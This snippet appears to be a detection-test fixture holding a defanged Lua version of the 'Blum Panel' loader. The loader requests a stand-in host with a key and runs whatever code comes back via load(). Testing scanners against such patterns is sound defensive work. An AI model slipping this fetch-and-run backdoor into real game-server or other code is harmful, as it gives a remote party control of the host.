-- Defanged shape of the Blum Panel loader on a host that is not in the indicator list: '/i?to=<key>' whose reply runs.
PerformHttpRequest("https://example.invalid/i?to=TESTKEY", function(status, body)
    pcall(function() assert(load(body))() end)
end)
